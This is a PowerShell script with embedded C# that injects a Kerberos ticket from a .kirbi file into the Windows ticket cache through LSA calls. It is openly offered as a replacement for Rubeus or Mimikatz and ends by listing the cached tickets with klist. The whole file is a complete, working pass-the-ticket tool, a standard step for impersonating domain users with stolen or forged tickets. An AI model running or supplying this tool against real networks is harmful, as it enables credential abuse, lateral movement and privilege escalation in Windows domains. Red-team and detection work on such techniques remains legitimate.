<#
    Author: vari.sh
    Main code taken from https://github.com/vletoux/MakeMeEnterpriseAdmin/

    Description: This script let you import your Kirbi Tickets in your Kerberos Cache without using Rubeus or Mimikatz.
                  If you have a dc.ccache instead you can use impacket 'python3 ticketConverter.py ticket.ccache ticket.kirbi'.
    Usage: .\TGTInjector.ps1 ticket.kirbi
#>

param (
    [string]$KirbiFile
)

if (-not (Test-Path $KirbiFile)) {
    Write-Host "[!] Error: file $KirbiFile not found!" -ForegroundColor Red
    exit 1
}

$ticketBytes = [System.IO.File]::ReadAllBytes($KirbiFile)

Add-Type -TypeDefinition @"
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace kerberos
{
    public class TGTImporter
    {
        [DllImport("secur32.dll", SetLastError = false)]
        private static extern int LsaConnectUntrusted([Out] out IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = false)]
        private static extern int LsaDeregisterLogonProcess([In] IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = false)]
        private static extern int LsaLookupAuthenticationPackage([In] IntPtr LsaHandle, [In] ref LSA_STRING PackageName, [Out] out int AuthenticationPackage);

        [DllImport("secur32.dll", SetLastError = false)]
        private static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle, int AuthenticationPackage, IntPtr ProtocolSubmitBuffer, int SubmitBufferLength, out IntPtr ProtocolReturnBuffer, out int ReturnBufferLength, out int ProtocolStatus);


        [DllImport("advapi32.dll", SetLastError = false)]
        private static extern int LsaNtStatusToWinError(int StatusCode);

        private enum KERB_PROTOCOL_MESSAGE_TYPE : uint
        {
            KerbSubmitTicketMessage = 21,
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LSA_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public String Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_CRYPTO_KEY32
        {
            public int KeyType;
            public int Length;
            public int Offset;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID {
            int LowPart;
            int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_SUBMIT_TKT_REQUEST
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public LUID LogonId;
            public int Flags;
            public KERB_CRYPTO_KEY32 Key; // key to decrypt KERB_CRED
            public int KerbCredSize;
            public int KerbCredOffset;
        }

        public static void ImportTGT(byte[] ticket)
        {
            IntPtr LsaHandle = IntPtr.Zero;
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;
            
            ntstatus = LsaConnectUntrusted(out LsaHandle);
            if (ntstatus != 0)
                throw new Win32Exception(LsaNtStatusToWinError(ntstatus));
            IntPtr inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try
            {
                LSA_STRING LSAString;
                string Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;

                ntstatus = LsaLookupAuthenticationPackage(LsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                    throw new Win32Exception(LsaNtStatusToWinError(ntstatus));

                KERB_SUBMIT_TKT_REQUEST request = new KERB_SUBMIT_TKT_REQUEST();
                request.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;
                request.KerbCredSize = ticket.Length;
                request.KerbCredOffset = Marshal.SizeOf(typeof(KERB_SUBMIT_TKT_REQUEST));
            
                int inputBufferSize = Marshal.SizeOf(typeof(KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);

                ntstatus = LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0)
                    throw new Win32Exception(LsaNtStatusToWinError(ntstatus));
                if (ProtocalStatus != 0)
                    throw new Win32Exception(LsaNtStatusToWinError(ProtocalStatus));
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);
                LsaDeregisterLogonProcess(LsaHandle);
            }
        }
    }
}
"@

Write-Host "[*] Importing Kerberos Ticket..."
[kerberos.TGTImporter]::ImportTGT($ticketBytes)

Write-Host "`n[*] Tickets in Kerberos cache:" -ForegroundColor Cyan
Start-Process -NoNewWindow -FilePath "klist.exe"
